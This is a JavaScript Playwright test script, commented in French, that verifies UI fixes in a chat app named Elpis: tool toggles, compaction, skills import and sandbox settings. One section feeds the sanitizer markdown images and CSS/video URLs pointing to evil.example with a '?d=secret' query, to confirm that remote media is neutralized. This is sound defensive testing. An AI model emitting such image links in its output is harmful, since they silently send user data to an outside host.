// SPDX-License-Identifier: MIT
// Vérif des correctifs UX (route-mock, sans backend) :
//   PERF_PORT=8907 node tests/frontend/uxfixes-server.mjs &
//   PERF_PORT=8907 node tests/frontend/uxfixes-verify.mjs
// 1. Toggles d'outils PAR CHAT : restauration au loadChat, PUT débouncé au
//    toggle, pas de PUT parasite à la restauration, re-restauration au switch.
// 2. Skills — onglet modal Paramètres en DRILL-DOWN taille fixe : header h-8
//    homogène, menu Importer 3 sources (.zip / dossier / SKILL.md seul),
//    import-folder multipart, toast précis, sélection auto post-import (ouvre
//    le DÉTAIL plein cadre → retour « ← Skills » avant chaque action liste),
//    corps markdown rendu (toggle Source), conflit 409 → confirm « Remplacer »
//    → retry overwrite=1, import .md via POST /api/skills raw_md, filtre
//    (compteur / no-results / clear), overlay drag-and-drop, sanity sombre.
// 2ter. Sandbox (onglet Paramètres, refonte 2026-07-19) : statut du container
//    en zone UNIQUE (un seul bouton Démarrer), profil réseau = MENU DÉROULANT
//    (détail du profil sélectionné dessous), chemin serveur du dossier NON
//    affiché, détails techniques REPLIÉS (refonte 2026-08-30), refresh sur
//    la rangée de statut, aucune carte imbriquée ;
//    « Effacer les conversations » déplacé Sandbox → Chat.
// 3. /compact : ligne « en cours » rendue comme un message assistant
//    (avatar + nom, même gouttière) puis notice persistante alignée.
import fs from 'fs';
import path from 'path';
import { launch, gotoApp, BASE_URL } from '../perf/lib/harness.mjs';

const SHOTS = process.env.SHOTS_DIR || '/tmp/uxfixes-shots';
fs.mkdirSync(SHOTS, { recursive: true });
const checks = [];
const ok = (name, cond) => { checks.push([cond ? 'PASS' : 'FAIL', name]); console.log((cond ? '  ✓ ' : '  ✗ ') + name); };

const { browser, page, errors } = await launch({ reducedMotion: 'reduce' });

async function catToggle(label) {
    // Ligne générique du panneau Outils : <label> … texte … <input.sr-only.peer>
    return page.locator(`.elpis-slide-panel label:has-text("${label}") input[type=checkbox]`).first();
}
async function toolputs() {
    return (await (await fetch(BASE_URL + '/__toolputs')).json()).items;
}

try {
    page.setDefaultTimeout(10000);
    await fetch(BASE_URL + '/__reset');   // purge les PUT/imports d'un run précédent
    await gotoApp(page, '/');
    ok('app montée (v-cloak levé, templates compilent)', true);

    // ════ 0bis. Anti-exfiltration : médias externes neutralisés au rendu ═════
    // P0 audit harness 2026-07-24 — utils.js _neutralizeRemoteMedia (branché en
    // sortie de sanitizeHtml, donc sous TOUT marked.parse) : <img> tierce →
    // chip-lien cliquable (aucun chargement auto), data:image/même-origine
    // conservées, video/style url() désarmés. Testé via window.elpisSanitize.
    {
        const r = await page.evaluate(() => ({
            ext:   window.elpisSanitize(window.marked.parse('![fuite](https://evil.example/x.png?d=secret)')),
            rel:   window.elpisSanitize('<img src="/api/files/apercu.png" alt="ok">'),
            same:  window.elpisSanitize('<img src="' + window.location.origin + '/static/logo.png">'),
            data:  window.elpisSanitize('<img src="data:image/png;base64,AAAA">'),
            style: window.elpisSanitize('<p style="background:url(https://evil.example/p.gif)">x</p>'),
            video: window.elpisSanitize('<video poster="https://evil.example/p.png" src="https://evil.example/v.mp4"></video>'),
        }));
        ok('img externe → chip-lien (plus de <img>, href conservé)',
           !r.ext.includes('<img') && r.ext.includes('elpis-ext-img')
           && r.ext.includes('https://evil.example/x.png?d=secret'));
        ok('img relative conservée',     r.rel.includes('<img'));
        ok('img same-origin conservée',  r.same.includes('<img'));
        ok('img data:image conservée',   r.data.includes('<img'));
        ok('style url() externe retiré', !r.style.includes('url('));
        ok('video externe désarmée',     !r.video.includes('evil.example'));
    }

    // ════ 1. Toggles d'outils par chat ═══════════════════════════════════
    await page.locator('#app').getByText('Chat A', { exact: false }).first().click();
    await page.waitForTimeout(600);
    // Ouvre le panneau Outils (bouton sidebar title="Outils").
    await page.locator('button[title*="Outils"]:visible').first().click();
    await page.waitForTimeout(400);
    ok('panneau Outils ouvert', await page.locator('.elpis-slide-panel:has-text("Locaux")').first().isVisible().catch(() => false));
    ok('restauration chat A : fs coché',    await (await catToggle('Fichiers')).isChecked());
    ok('restauration chat A : shell coché', await (await catToggle('Shell')).isChecked());
    ok('restauration chat A : web décoché', !(await (await catToggle('Web')).isChecked()));
    const putsAfterLoad = await toolputs();
    ok('aucun PUT parasite à la restauration', putsAfterLoad.length === 0);

    // Toggle « Web » → PUT débouncé (600 ms) avec l'état complet.
    await (await catToggle('Web')).click({ force: true });   // input sr-only
    await page.waitForTimeout(1000);
    const puts1 = await toolputs();
    const last1 = puts1[puts1.length - 1] || {};
    ok('PUT après coche (chat A)', last1.chatId === 'A');
    ok('PUT contient fs+shell+web', JSON.stringify((last1.tools || []).slice().sort()) === JSON.stringify(['fs', 'shell', 'web']));

    // Switch B : tools=[] explicite → tout décoché ; pas de PUT pour B.
    await page.locator('#app').getByText('Chat B', { exact: false }).first().click();
    await page.waitForTimeout(600);
    ok('chat B : fs décoché',    !(await (await catToggle('Fichiers')).isChecked()));
    ok('chat B : shell décoché', !(await (await catToggle('Shell')).isChecked()));
    const puts2 = await toolputs();
    ok('pas de PUT parasite pour B', !puts2.some(p => p.chatId === 'B'));

    // Retour A : re-restauration depuis le serveur (fs+shell, web retombe).
    await page.locator('#app').getByText('Chat A', { exact: false }).first().click();
    await page.waitForTimeout(600);
    ok('retour A : fs re-coché',  await (await catToggle('Fichiers')).isChecked());
    ok('retour A : web décoché (état serveur)', !(await (await catToggle('Web')).isChecked()));
    await page.screenshot({ path: path.join(SHOTS, 'ux1-toggles-chatA.png') });

    // Nouveau chat : AUCUN outil sélectionné par défaut (pas d'héritage).
    const putsBeforeNew = (await toolputs()).length;
    await page.locator('button:has-text("Nouveau chat"):visible').first().click();
    await page.waitForTimeout(500);
    ok('nouveau chat : fs décoché',    !(await (await catToggle('Fichiers')).isChecked()));
    ok('nouveau chat : shell décoché', !(await (await catToggle('Shell')).isChecked()));
    ok('nouveau chat : web décoché',   !(await (await catToggle('Web')).isChecked()));
    ok('nouveau chat : aucun PUT (chat non créé)', (await toolputs()).length === putsBeforeNew);
    // Retour A pour la suite (compaction) : la restauration marche toujours.
    await page.locator('#app').getByText('Chat A', { exact: false }).first().click();
    await page.waitForTimeout(600);
    ok('re-retour A : fs re-coché', await (await catToggle('Fichiers')).isChecked());

    // ════ 3. /compact : ligne agent alignée ══════════════════════════════
    const composer = page.locator('textarea:visible').first();
    await composer.click();
    await composer.fill('/');
    await page.waitForTimeout(400);
    // Panneau « / » : sa largeur SUIT la colonne du composeur (fix 2026-07-19 —
    // ancré sur la bande pleine largeur avant, il ignorait la largeur de la
    // barre de prompt réglée par chat_width).
    const slashPanel = page.locator('.elpis-compose-col > div.bottom-full:visible').first();
    const colBox = await page.locator('.elpis-compose-col').first().boundingBox();
    const panBox = await slashPanel.boundingBox().catch(() => null);
    ok('panneau « / » aligné sur la largeur de la barre de prompt',
       !!colBox && !!panBox && Math.abs(panBox.width - colBox.width) < 2 && Math.abs(panBox.x - colBox.x) < 2);
    await page.screenshot({ path: path.join(SHOTS, 'ux3-slash-panel.png') });
    // Cibler la RANGÉE, pas son libellé : le menu « / » est un registre
    // (chat/_slash.js) dont les libellés suivent la règle « un ou deux mots ».
    // Un sélecteur textuel se casserait au moindre remaniement de formulation.
    await page.locator('#slash-list li[data-slash-row]')
        .filter({ hasText: '/compact' }).first().click();
    await page.waitForTimeout(500);   // POST mocké répond en 1200 ms → fenêtre « en cours »
    const banner = page.locator('div[role="status"].elpis-msg-assistant');
    ok('ligne « compaction en cours » visible', await banner.getByText('Compaction en cours').isVisible().catch(() => false));
    // Progression VISIBLE sans animation CSS (prefers-reduced-motion, l'OS du
    // user) : pourcentage + barre pilotés par JS — le harnais tourne d'ailleurs
    // en reducedMotion:'reduce', comme la vraie machine.
    ok('…avec un pourcentage de progression', /\d+\s?%/.test(await banner.innerText().catch(() => '')));
    ok('…avec l\'avatar de l\'agent', await banner.locator('.w-9.h-9 i.ph-robot').first().isVisible().catch(() => false));
    ok('…avec le nom de l\'agent (Elpis)', await banner.getByText('Elpis').first().isVisible().catch(() => false));
    // Alignement : la gouttière avatar du bandeau == celle d'un message assistant.
    const avMsg = await page.locator('.elpis-msg-assistant > .shrink-0').first().boundingBox();
    const avBan = await banner.locator('> .shrink-0').first().boundingBox();
    ok('gouttière avatar alignée sur les messages', !!avMsg && !!avBan && Math.abs(avMsg.x - avBan.x) < 1);
    await page.screenshot({ path: path.join(SHOTS, 'ux3-compaction-running.png') });
    await page.waitForTimeout(1600);
    const notice = page.locator('.elpis-msg-assistant:has-text("Conversation compactée")').first();
    ok('notice persistante « Conversation compactée » dans le fil', await notice.isVisible().catch(() => false));
    ok('notice : avatar agent présent', await notice.locator('.w-9.h-9 i.ph-robot').first().isVisible().catch(() => false));
    ok('notice : taille de contexte affichée', /≈\s*300/.test(await notice.innerText().catch(() => '')));
    // Accordéon « Vérifier le compact » (UX 2026-07-25) : replié par défaut,
    // le résumé produit n'apparaît qu'au clic — et il apparaît EN ENTIER.
    const compactToggle = notice.getByText('Vérifier le compact').first();
    ok('notice : accordéon « Vérifier le compact » présent', await compactToggle.isVisible().catch(() => false));
    ok('accordéon replié : résumé non visible', !/clef: valeur importante/.test(await notice.innerText().catch(() => '')) ||
       !(await notice.locator('details[open]').count()));
    await compactToggle.click();
    await page.waitForTimeout(200);
    const noticeTxt = await notice.innerText().catch(() => '');
    ok('accordéon ouvert : résumé complet affiché (context + facts)',
       /Conversation de test compactée/.test(noticeTxt) && /clef: valeur importante/.test(noticeTxt));
    await page.screenshot({ path: path.join(SHOTS, 'ux3-compaction-notice.png') });
    await compactToggle.click();   // referme pour la suite
    await page.waitForTimeout(150);

    // ════ 4. Stats live DANS la barre du composeur ═══════════════════════
    // (déplacées depuis la ligne centrée au-dessus du composeur ; sans le
    // nom du modèle, déjà porté par le sélecteur juste à gauche.)
    await composer.fill('dis bonjour');
    await composer.press('Enter');
    await page.waitForTimeout(700);          // stream mocké ≈ 2 s
    const statsBar = page.locator('.elpis-compose-card div.font-mono:has-text("tok/s")').first();
    ok('stats live rendues DANS la barre de prompt', await statsBar.isVisible().catch(() => false));
    const statsTxt = await statsBar.innerText().catch(() => '');
    ok('nom du modèle absent des stats (porté par le sélecteur)', !statsTxt.includes('m1'));
    // Pendant la 1re réflexion (avant tout event kv_cache, ~1 s dans le mock),
    // la partie ctx affiche « 0 / n_ctx » — le budget de contexte, pas du vide.
    // n_ctx=8192 → « 0 / 8.2k ». C'est le correctif demandé.
    ok('ctx live « 0 / 8.2k » pendant la 1re réflexion (avant kv_cache)',
       statsTxt.includes('0 / 8.2k'));
    const selBB = await page.locator('[data-model-manager] > button').first().boundingBox();
    const statsBB = await statsBar.boundingBox();
    ok('alignement vertical avec le sélecteur de modèle',
       !!selBB && !!statsBB && Math.abs((selBB.y + selBB.height / 2) - (statsBB.y + statsBB.height / 2)) < 4);
    await page.waitForTimeout(700);          // l'event kv_cache est passé (~1 s)
    ok('ctx live « 1.8k / 8.2k » après kv_cache (mesure réelle remplace le 0)',
       /1\.8k \/ 8\.2k/.test(await statsBar.innerText().catch(() => '')));
    ok('plus de ligne de stats AU-DESSUS du composeur',
       await page.locator('.elpis-compose-col > div.mb-2:has-text("tok/s")').count() === 0);
    await page.screenshot({ path: path.join(SHOTS, 'ux4-livegen-composer.png') });
    await page.waitForTimeout(1600);         // fin du stream avant la suite

    // ════ 1bis. Questionnaire ask_user (outil restauré 2026-07-19) ═══════
    // Le mock streame tool_call(ask_user) puis final : le panneau doit
    // s'ouvrir À LA FIN du tour, se naviguer (options + champ libre) et
    // envoyer les réponses groupées en UN message markdown.
    const taAsk = page.locator('#app textarea').first();
    await taAsk.fill('askuser-demo');
    await page.locator('button[title="Envoyer le message"]').first().click();
    const askPanel = page.locator('div[aria-label="Questionnaire de l\'assistant"]');
    await askPanel.waitFor({ state: 'visible', timeout: 8000 }).catch(() => {});
    ok('ask_user : panneau ouvert à la fin du tour', await askPanel.isVisible().catch(() => false));
    ok('ask_user : progression « question 1 / 2 »',
       /question 1 \/ 2/.test(await askPanel.innerText().catch(() => '')));
    await askPanel.locator('button:has-text("Déploiement")').first().click();
    ok('ask_user : option sélectionnée (aria-pressed)',
       (await askPanel.locator('button[aria-pressed="true"]').count()) === 1);
    await askPanel.locator('button:has-text("Suivant")').first().click();
    ok('ask_user : navigation → question 2',
       /question 2 \/ 2/.test(await askPanel.innerText().catch(() => '')));
    await askPanel.locator('input').first().fill('make deploy');
    await askPanel.locator('button:has-text("Envoyer les réponses")').first().click();
    await page.waitForTimeout(600);
    ok('ask_user : panneau fermé après envoi', !(await askPanel.isVisible().catch(() => false)));
    const _appTxt = await page.locator('#app').innerText().catch(() => '');
    ok('ask_user : réponses groupées envoyées en UN message markdown',
       /Dans quelle situation \?/.test(_appTxt) && /Déploiement/.test(_appTxt) && /make deploy/.test(_appTxt));
    await page.screenshot({ path: path.join(SHOTS, 'ux1bis-askuser.png') });
    await page.waitForTimeout(2200);         // fin du stream de la réponse avant la §2

    // ════ 2. Skills — onglet de la modal Paramètres (déménagé 2026-07-18,
    //      ex-page pleine skills_page.html) ═══════════════════════════════
    await page.locator('button[title="Paramètres"]:visible').first().click();
    await page.waitForTimeout(400);
    await page.locator('aside button:has-text("Skills"):visible').first().click();
    await page.waitForTimeout(600);
    ok('onglet Skills ouvert dans la modal Paramètres', await page.locator('#app').getByText('Mémoire procédurale').first().isVisible().catch(() => false));
    // Drill-down : après un import, la sélection auto ouvre le DÉTAIL plein
    // cadre (toolbar liste masquée) → retour guardé vers la liste au besoin.
    const backToList = async () => {
        const b = page.getByLabel('Retour à la liste des skills').first();
        if (await b.isVisible().catch(() => false)) { await b.click(); await page.waitForTimeout(250); }
    };
    // Hauteur de contrôle homogène (h-8 = 32px) sur les 4 actions de la toolbar.
    const heights = [];
    const skillsHeader = page.locator('div[aria-label="Gestion des skills"]');
    for (const sel of ['button:has-text("Assistant")', 'button:has-text("Nouveau")',
                       'button:has-text("Importer")', 'button[title="Rafraîchir"]']) {
        const bb = await skillsHeader.locator(sel + ':visible').first().boundingBox();
        heights.push(bb ? Math.round(bb.height) : -1);
    }
    ok('header : 4 contrôles à 32px (' + heights.join(',') + ')', heights.every(h => h === 32));
    // Arbre : package jenkins + badge sous-skills, icônes Phosphor (pas d'emoji).
    ok('arbre : domaine/pkg jenkins listé', await page.locator('#app').getByText('jenkins').first().isVisible().catch(() => false));
    const skillsHtml = await page.locator('#app').innerHTML();
    ok('plus d\'emoji 📦/📂 dans la vue', !/📦|📂/.test(skillsHtml));

    // Menu Importer : 3 sources.
    await page.locator('button:has-text("Importer"):visible').first().click();
    await page.waitForTimeout(250);
    ok('menu : option Archive .zip', await page.locator('#app').getByText('Archive .zip').first().isVisible().catch(() => false));
    ok('menu : option Dossier de skill', await page.locator('#app').getByText('Dossier de skill').first().isVisible().catch(() => false));
    ok('menu : option Fichier SKILL.md', await page.locator('#app').getByText('Fichier SKILL.md').first().isVisible().catch(() => false));
    await page.screenshot({ path: path.join(SHOTS, 'ux2-skills-import-menu.png') });

    // Import DOSSIER réel : setInputFiles(dossier) sur l'input webkitdirectory.
    const dir = path.join(SHOTS, 'impeccable-test');
    fs.mkdirSync(path.join(dir, 'scripts'), { recursive: true });
    fs.writeFileSync(path.join(dir, 'SKILL.md'), '---\nname: impeccable-test\ndescription: d\n---\n\ncorps\n');
    fs.writeFileSync(path.join(dir, 'scripts', 'run.sh'), '#!/bin/sh\necho ok\n');
    let folderUploadOk = true;
    try {
        await page.getByLabel('Importer un dossier de skill').setInputFiles(dir);
    } catch (e) {
        folderUploadOk = false;
        console.log('  (setInputFiles(dir) non supporté par cette version : ' + e.message + ')');
    }
    if (folderUploadOk) {
        await page.waitForTimeout(800);
        const imports = (await (await fetch(BASE_URL + '/__imports')).json()).items;
        const paths = (imports[0] || {}).paths || [];
        ok('import-folder : multipart reçu', imports.length === 1);
        ok('import-folder : chemins relatifs préservés (' + paths.join(' | ') + ')',
           paths.some(p => p.endsWith('impeccable-test/SKILL.md')) &&
           paths.some(p => p.endsWith('impeccable-test/scripts/run.sh')));
        ok('toast précis « Skill « impeccable-test » importé »',
           await page.locator('#app').getByText('Skill « impeccable-test » importé').first().isVisible().catch(() => false));
        // Sélection auto : le détail du skill importé s'ouvre tout seul.
        await page.waitForTimeout(400);
        const detail = page.locator('div[aria-label="Gestion des skills"]');
        ok('sélection auto du skill importé (détail ouvert)',
           await detail.locator('h4:has-text("impeccable-test")').first().isVisible().catch(() => false));
        // Corps rendu en MARKDOWN par défaut (pipeline marked+DOMPurify du chat).
        ok('corps rendu en markdown (h1 présent, plus de <pre> brut)',
           await detail.locator('.markdown-body h1').first().isVisible().catch(() => false));
        await page.screenshot({ path: path.join(SHOTS, 'ux2-skills-detail-markdown.png') });
        // Bascule « Source » → texte brut.
        await detail.locator('button:has-text("Source")').first().click();
        await page.waitForTimeout(150);
        ok('bascule Source → texte brut du SKILL.md',
           await detail.locator('pre:has-text("# Jenkins")').first().isVisible().catch(() => false));

        // Ré-import du même dossier → 409 → confirm « Remplacer » → overwrite=1.
        await backToList();                    // quitter le détail auto-ouvert
        await page.locator('button:has-text("Importer"):visible').first().click();
        await page.waitForTimeout(250);
        await page.getByLabel('Importer un dossier de skill').setInputFiles(dir);
        await page.waitForTimeout(600);
        ok('conflit : dialog « Remplacer le skill » affiché',
           await page.locator('#app').getByText('Remplacer le skill « impeccable-test » ?').first().isVisible().catch(() => false));
        await page.locator('button:has-text("Remplacer"):visible').first().click();
        await page.waitForTimeout(800);
        const imports2 = (await (await fetch(BASE_URL + '/__imports')).json()).items;
        const last2 = imports2[imports2.length - 1] || {};
        ok('retry avec overwrite=1 après confirmation', imports2.length === 2 && last2.overwrite === true);
    }

    // Import d'un SKILL.md seul → POST /api/skills {raw_md} (pas de route dédiée).
    const mdPath = path.join(SHOTS, 'hello.md');
    fs.writeFileSync(mdPath, '---\nname: hello\ndescription: dd\n---\n\n# Hello\n');
    await backToList();                        // quitter le détail auto-ouvert
    await page.locator('button:has-text("Importer"):visible').first().click();
    await page.waitForTimeout(250);
    await page.getByLabel('Importer un fichier SKILL.md').setInputFiles(mdPath);
    await page.waitForTimeout(700);
    const mdposts = (await (await fetch(BASE_URL + '/__mdposts')).json()).items;
    ok('.md seul : POST /api/skills reçu avec raw_md (name: hello)',
       mdposts.length === 1 && /name:\s*hello/.test(mdposts[0].raw_md || ''));
    ok('.md seul : toast « Skill « hello » importé »',
       await page.locator('#app').getByText('Skill « hello » importé').first().isVisible().catch(() => false));

    // Filtre : no-results distinct + bouton Effacer + compteur + clear (✕).
    await backToList();                        // quitter le détail auto-ouvert
    const filterInput = page.locator('div[aria-label="Gestion des skills"] input[placeholder^="Filtrer"]');
    await filterInput.fill('zzz-introuvable');
    await page.waitForTimeout(250);
    ok('filtre sans correspondance : « Aucun résultat pour … »',
       await page.locator('#app').getByText('Aucun résultat pour').first().isVisible().catch(() => false));
    await page.locator('button:has-text("Effacer le filtre"):visible').first().click();
    await page.waitForTimeout(250);
    ok('« Effacer le filtre » restaure l\'arbre',
       await page.locator('#app').getByText('jenkins').first().isVisible().catch(() => false));
    await filterInput.fill('jenkins');
    await page.waitForTimeout(250);
    ok('compteur de résultats du filtre',
       /2 résultats/.test(await page.locator('div[aria-label="Gestion des skills"]').innerText().catch(() => '')));
    ok('bouton clear (✕) du filtre présent', await page.getByLabel('Effacer le filtre').first().isVisible().catch(() => false));
    await page.getByLabel('Effacer le filtre').first().click();
    await page.waitForTimeout(200);

    // Overlay drag-and-drop : dragenter avec un vrai DataTransfer « Files ».
    const dtHandle = await page.evaluateHandle(() => {
        const d = new DataTransfer();
        d.items.add(new File(['x'], 'x.zip', { type: 'application/zip' }));
        return d;
    });
    await page.dispatchEvent('div[aria-label="Gestion des skills"]', 'dragenter', { dataTransfer: dtHandle });
    await page.waitForTimeout(150);
    ok('overlay DnD « Déposer pour importer » affiché',
       await page.locator('#app').getByText('Déposer pour importer').first().isVisible().catch(() => false));
    await page.dispatchEvent('div[aria-label="Gestion des skills"]', 'dragleave', { dataTransfer: dtHandle });
    await page.waitForTimeout(150);
    ok('overlay DnD masqué après dragleave',
       !(await page.locator('#app').getByText('Déposer pour importer').first().isVisible().catch(() => false)));

    // Sanity mode sombre : le fond de la page suit les tokens (bridge bg-white
    // → var(--surface)) — la page ne reste pas blanche en sombre.
    const darkBg = await page.evaluate(() => {
        document.body.classList.add('elpis-app-dark');
        const bg = getComputedStyle(document.querySelector('div[aria-label="Gestion des skills"]')).backgroundColor;
        document.body.classList.remove('elpis-app-dark');
        return bg;
    });
    ok('mode sombre : fond de page tokenisé (' + darkBg + ')',
       !!darkBg && darkBg !== 'rgb(255, 255, 255)');
    await page.screenshot({ path: path.join(SHOTS, 'ux2-skills-page.png') });

    // ════ 2ter. Sandbox — onglet Paramètres (statut unique, profils boutons) ═
    // Mock : container existant ARRÊTÉ → la régression « double bouton
    // Démarrer » (résumé + branche runtime) est observable.
    await backToList();                        // au cas où (détail skills ouvert)
    await page.locator('aside button:has-text("Sandbox"):visible').first().click();
    await page.waitForTimeout(500);
    const dlg = page.locator('div[aria-label="Paramètres"]');
    ok('sandbox : chemin serveur du dossier NON affiché',
       !(await dlg.getByText('/home/alice/sandbox').first().isVisible().catch(() => false)));
    ok('sandbox : container arrêté affiché (nom mono)',
       await dlg.getByText('elpis-sb-alice').first().isVisible().catch(() => false));
    // ⚠ `has-text()` matche en sous-chaîne ET sans tenir compte de la casse :
    // « Redémarrer » y répondrait. Rôle + nom exact, sinon le test ment.
    const btnDemarrer = dlg.getByRole('button', { name: 'Démarrer', exact: true });
    const nbDemarrer = await btnDemarrer.count();
    ok('sandbox : UN SEUL bouton Démarrer (' + nbDemarrer + ')', nbDemarrer === 1);
    // Le <select> natif a laissé la place à un menu maison (2026-08-30) :
    // on vérifie le DÉCLENCHEUR, puis la liste une fois ouverte.
    const netTrigger = dlg.locator('#sandbox-net-profile');
    ok('sandbox : déclencheur du profil réseau (nom + mode)',
       (await netTrigger.innerText().catch(() => '')).includes('Isolé')
       && (await netTrigger.innerText().catch(() => '')).includes('isolé'));
    ok('sandbox : menu fermé au repos',
       (await netTrigger.getAttribute('aria-expanded').catch(() => '')) === 'false'
       && await dlg.locator('[role="listbox"]').count() === 0);
    await netTrigger.click();
    await page.waitForTimeout(250);
    const netOpts = dlg.locator('[data-net-menu] [role="option"]');
    ok('sandbox : menu ouvert = 3 profils',
       (await netTrigger.getAttribute('aria-expanded').catch(() => '')) === 'true'
       && await netOpts.count() === 3);
    ok('sandbox : profil actif marqué aria-selected',
       (await netOpts.nth(0).getAttribute('aria-selected').catch(() => '')) === 'true');
    ok('sandbox : chaque option dit ce qu\'elle implique',
       (await netOpts.nth(0).innerText().catch(() => '')).includes('Aucun accès réseau sortant.')
       && (await netOpts.nth(1).innerText().catch(() => '')).includes('Accès réseau complet.'));
    // Échap referme et rend le focus au déclencheur (contrat clavier).
    await page.keyboard.press('Escape');
    await page.waitForTimeout(250);
    ok('sandbox : Échap referme le menu',
       await dlg.locator('[data-net-menu] [role="listbox"]').count() === 0);
    ok('sandbox : détail du profil sélectionné affiché',
       await dlg.getByText('Aucun accès réseau sortant.').first().isVisible().catch(() => false));
    // Les faits techniques sont VISIBLES d'emblée : plus de dépliant.
    ok('sandbox : image et limites visibles sans geste',
       await dlg.getByText('RAM max').first().isVisible().catch(() => false)
       && await dlg.getByText('elpis/sandbox:1.5.0').first().isVisible().catch(() => false));
    ok('sandbox : rafraîchir présent sur la rangée de statut',
       await dlg.getByLabel('Rafraîchir l\'état de la sandbox').first().isVisible().catch(() => false));
    // ⚠ Cibler les DIV seulement : un <button> ou un popover flottant porte
    // légitimement fond + bordure (c'est un contrôle, pas un conteneur de
    // contenu). L'interdit vise la carte imbriquée, pas la géométrie.
    ok('sandbox : aucune carte dans une carte',
       await dlg.locator('.set-block div.bg-white.border.border-slate-200.rounded-lg').count() === 0);

    // ── Démarrage : barre de progression AVEC les étapes (2026-08-30).
    //    Ni « Démarrer » ni « Redémarrer » ne l'avaient — seules la création
    //    et le changement de profil passaient par `runTransition`. Ces
    //    actions duraient donc plusieurs secondes en silence complet.
    await dlg.getByRole('button', { name: 'Démarrer', exact: true }).first().click();
    await page.waitForTimeout(250);
    ok('sandbox : confirmation adaptée au DÉMARRAGE (et non « redémarrer »)',
       await page.locator('#app').getByText('Démarrer votre container ?').first().isVisible().catch(() => false));
    // ⚠ Les DEUX boutons s'appellent « Démarrer » (celui de la rangée et
    //    celui de la confirmation) : il faut viser la boîte de confirmation,
    //    sinon Playwright clique celui du fond, bloqué par le voile.
    await page.locator('div.fixed.inset-0.z-\\[7000\\]')
              .getByRole('button', { name: 'Démarrer', exact: true }).click();
    const bar = dlg.locator('[role="progressbar"]');
    await bar.first().waitFor({ state: 'visible', timeout: 4000 }).catch(() => {});
    ok('sandbox : barre de progression au démarrage',
       await bar.count() > 0);
    ok('sandbox : étapes annoncées pendant le démarrage',
       /Étape \d+ sur \d+/.test(await dlg.innerText().catch(() => '')));
    // Laisser la transition finir avant la suite (elle masque tout le bloc).
    await bar.first().waitFor({ state: 'detached', timeout: 10000 }).catch(() => {});
    await page.waitForTimeout(400);

    // ── Container ACTIF : l'état le plus fréquent, et celui qui porte le
    //    plus d'interface (consommation live + Redémarrer/Détruire). Il
    //    n'avait aucune couverture avant la refonte 2026-08-30.
    await page.evaluate(() => fetch('/mock/sandbox-running'));
    await dlg.getByLabel("Rafraîchir l'état de la sandbox").first().click();
    await page.waitForTimeout(400);
    ok('sandbox actif : état « Actif »',
       await dlg.getByText('Actif', { exact: true }).first().isVisible().catch(() => false));
    ok('sandbox actif : consommation live (CPU/RAM/PIDs)',
       await dlg.getByText('186 Mo').first().isVisible().catch(() => false)
       && await dlg.getByText('2,4 %').first().isVisible().catch(() => false));
    ok('sandbox actif : actions Redémarrer + Détruire',
       await dlg.getByRole('button', { name: 'Redémarrer', exact: true }).count() === 1
       && await dlg.getByRole('button', { name: 'Détruire', exact: true }).count() === 1);
    ok('sandbox actif : plus de bouton Démarrer',
       await dlg.getByRole('button', { name: 'Démarrer', exact: true }).count() === 0);
    await page.screenshot({ path: path.join(SHOTS, 'sandbox-tab-actif.png') });
    await page.evaluate(() => fetch('/mock/sandbox-running'));   // remet l'état initial
    await dlg.getByLabel("Rafraîchir l'état de la sandbox").first().click();
    await page.waitForTimeout(400);
    // La sandbox est TOUJOURS persistante (réglage « éphémère » retiré
    // 2026-08-30) : repartir propre se fait à la demande, par un instantané
    // puis « Vider le dossier de travail » ci-dessous.
    ok('sandbox : plus aucun réglage d\'éphémère',
       !(await dlg.getByText(/Repartir d'une sandbox vide/).first().isVisible().catch(() => false)));

    ok('sandbox : nettoyage — Vider le dossier de travail',
       await dlg.getByText('Vider le dossier de travail').first().isVisible().catch(() => false));
    ok('sandbox : « Effacer les conversations » RETIRÉ de l\'onglet',
       !(await dlg.getByText('Effacer les conversations').first().isVisible().catch(() => false)));
    await page.screenshot({ path: path.join(SHOTS, 'ux2ter-sandbox-tab.png') });
    // Profil imposé par l'admin (2026-08-05) : sélecteur verrouillé + mention.
    ok('sandbox : profil libre → sélecteur actif',
       !(await netTrigger.isDisabled().catch(() => true))
       && !(await dlg.getByText('Imposé').first().isVisible().catch(() => false)));
    await page.evaluate(() => fetch('/mock/lock-profile'));
    await dlg.getByLabel('Rafraîchir l\'état de la sandbox').first().click();
    await page.waitForTimeout(400);
    ok('sandbox : profil imposé → sélecteur verrouillé',
       await netTrigger.isDisabled().catch(() => false));
    ok('sandbox : profil imposé → mention « Imposé »',
       await dlg.getByText('Imposé').first().isVisible().catch(() => false));
    await page.evaluate(() => fetch('/mock/lock-profile'));   // remet l'état initial
    await dlg.getByLabel('Rafraîchir l\'état de la sandbox').first().click();
    await page.waitForTimeout(400);
    // …l'action vit désormais dans l'onglet Chat (action chat, pas sandbox).
    await dlg.locator('aside button:has-text("Chat")').first().click();
    await page.waitForTimeout(300);
    ok('chat : « Effacer les conversations » présent (déplacé)',
       await dlg.getByText('Effacer les conversations').first().isVisible().catch(() => false));

    // ════ Bilan ═════════════════════════════════════════════════════════
    const jsErrors = errors.filter(e => !/ResizeObserver|favicon/.test(e));
    ok('aucune erreur JS page', jsErrors.length === 0);
    if (jsErrors.length) console.log('  erreurs: ' + jsErrors.join(' ; '));
} finally {
    await browser.close();
}
const fails = checks.filter(c => c[0] === 'FAIL');
console.log(`\n${checks.length - fails.length}/${checks.length} PASS`);
process.exit(fails.length ? 1 : 0);
